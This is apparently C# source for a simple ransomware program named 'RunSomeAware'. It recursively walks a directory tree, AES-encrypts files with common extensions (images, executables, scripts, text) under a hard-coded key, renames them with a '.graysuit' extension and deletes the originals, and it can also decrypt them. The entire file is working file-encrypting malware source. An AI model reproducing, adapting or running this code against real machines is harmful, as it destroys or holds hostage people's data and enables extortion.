using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Diagnostics;

//https://github.com/DarkSecDevelopers/RunSomeAware
class RunSomeAware
{
    public static string key = "MyPrivateKey";
    public static string CrypterExt = ".graysuit";
    public static string ParentDirectory = @"C:\Users\gray\Desktop\test";
    public static string[] AllowedExt = { ".png", ".exe", ".cmd",".html",".7z",".bat",".cpp",".js", ".txt", ".cs", CrypterExt };
    public static long BytesRead = 0;

    public static void Main()
    {
        Stopwatch watch = Stopwatch.StartNew();
        if (Start(ParentDirectory)) Console.WriteLine("Speed:" + (BytesRead / (watch.ElapsedMilliseconds * 0.001 * 1024 * 1024)) + " MB/s");
    }
    static bool Start(string ParentDir)
    {
        foreach (string file in Directory.GetFiles(ParentDir))
        {
            if (Contain(new FileInfo(file).Extension, AllowedExt))
            {
                Crypt(file);
                Console.WriteLine((file.EndsWith(CrypterExt) ? "De" : "En") + "crypted : " + file);
                BytesRead += new FileInfo(file).Length;
                File.Delete(file);
            }
        }
        foreach (string dir in Directory.GetDirectories(ParentDir)) Start(dir);
        return true;
    }

    static void Crypt(string file)
    {
        using (FileStream filestream = File.Open(file, FileMode.Open, FileAccess.Read))
        {
            using (FileStream stream = new FileStream(file.EndsWith(CrypterExt) ? file.Replace(CrypterExt, "") : file + CrypterExt, FileMode.Create, FileAccess.Write))
            {
                using (Rijndael AES = new RijndaelManaged())
                {
                    AES.Key = (new SHA256Managed()).ComputeHash(Encoding.ASCII.GetBytes(key));
                    AES.Mode = CipherMode.ECB;
                    using (CryptoStream crypto = new CryptoStream(stream, file.EndsWith(CrypterExt) ? AES.CreateDecryptor() : AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        byte[] buffer = new byte[filestream.Length];
                        while (filestream.Read(buffer, 0, buffer.Length) > 0)
                        {
                            crypto.Write(buffer, 0, buffer.Length);
                        }
                    }
                }
            }
        }
    }
    static bool Contain(string value, string[] values)
    {
        foreach (string val in values) if (val.Trim() == value.Trim()) return true;
        return false;
    }
}